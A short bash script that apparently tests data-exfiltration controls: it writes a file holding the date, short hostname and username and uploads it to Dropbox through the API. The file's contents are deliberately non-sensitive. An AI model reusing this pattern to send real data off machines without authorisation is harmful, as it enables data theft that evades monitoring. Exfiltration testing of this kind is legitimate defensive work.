#!/bin/bash
# Tim H 2023
# upload-file-to-dropbox-mac-linux.sh
#
# Creates a non-sensitive test file and uploads it to Dropbox via the Dropbox
# API. Requires a valid Dropbox API Access Token.
#
# validated on Ubuntu 20.04 and MacOS 14.1.2
DROPBOX_ACCESS_TOKEN='REPLACEME'

set -e

# References:
# https://www.dropbox.com/developers/documentation/http/documentation
# https://www.dropbox.com/developers/documentation/http/documentation#files-download
# https://www.dropbox.com/developers/reference/getting-started
# https://www.dropbox.com/developers/apps/create
# https://www.dropbox.com/developers/apps/info/p4089oe7t6md973

# test basic authentication, make sure token is working before proceeding
# this works when a recent token is used and it is NOT base64 encoded
curl -X POST "https://api.dropboxapi.com/2/users/get_current_account" \
  --header "Authorization: Bearer $DROPBOX_ACCESS_TOKEN"

# unique, dynamic filename upload
# creating a unique file to upload so it can be done on repeat
NOW=$(date +"%Y_%m_%d_%I_%M_%p_%z")
UNIQUE_UPLOAD_FILENAME="example_exfilration_data_${NOW}.txt"

# generate a file with contents that prove exfiltration is possible, but
# don't reveal anything sensitive:
# line breaks are necessary
# intentionally using short hostname to avoid sending sensitive data
{
date
hostname -s
whoami
} > "$UNIQUE_UPLOAD_FILENAME"

# upload the file
curl -X POST https://content.dropboxapi.com/2/files/upload \
    --header "Authorization: Bearer $DROPBOX_ACCESS_TOKEN" \
    --header "Dropbox-API-Arg: {\"autorename\":false,\"mode\":\"add\",\"mute\":false,\"path\":\"/$UNIQUE_UPLOAD_FILENAME\",\"strict_conflict\":false}" \
    --header "Content-Type: application/octet-stream" \
    --data-binary @"$UNIQUE_UPLOAD_FILENAME"

# list files in root folder
# make it look pretty w/ jq, easier to read
curl -X POST https://api.dropboxapi.com/2/files/list_folder \
    --header "Authorization: Bearer $DROPBOX_ACCESS_TOKEN" \
    --header "Content-Type: application/json" \
    --data "{\"include_deleted\":false,\"include_has_explicit_shared_members\":false,\"include_media_info\":false,\"include_mounted_folders\":true,\"include_non_downloadable_files\":true,\"path\":\"\",\"recursive\":false}" | jq

echo "script finished successfully"
